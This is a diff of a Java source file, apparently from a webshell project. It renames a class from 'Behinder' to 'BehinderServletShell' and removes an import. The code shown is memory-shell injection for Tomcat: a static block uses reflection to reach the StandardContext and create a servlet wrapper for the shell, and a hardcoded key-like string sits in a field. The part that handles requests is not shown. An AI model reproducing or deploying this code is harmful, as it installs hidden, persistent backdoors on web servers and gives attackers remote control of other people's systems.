@@ -2,7 +2,6 @@ import org.apache.catalina.Container;
 import org.apache.catalina.Wrapper;
 import org.apache.catalina.core.ApplicationContext;
 import org.apache.catalina.core.StandardContext;
-import org.apache.catalina.loader.WebappClassLoaderBase;
 import org.springframework.web.context.request.RequestContextHolder;
 import org.springframework.web.context.request.ServletRequestAttributes;
 
@@ -19,7 +18,7 @@ import java.lang.reflect.Method;
 import java.util.HashMap;
 import java.util.Map;
 
-public class Behinder implements Servlet {
+public class BehinderServletShell implements Servlet {
     private final String pa = "2028ea0825d3605d";
 
     static {
@@ -34,7 +33,7 @@ public class Behinder implements Servlet {
             Field stdctx = applicationContext.getClass().getDeclaredField("context");
             stdctx.setAccessible(true);
             StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
-            Behinder behinderServlet = new Behinder();
+            BehinderServletShell behinderServlet = new BehinderServletShell();
             Method createWrapper = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredMethod("createWrapper");
             Wrapper greetWrapper = (Wrapper) createWrapper.invoke(standardContext);
             Method gname = Container.class.getDeclaredMethod("setName", String.class);
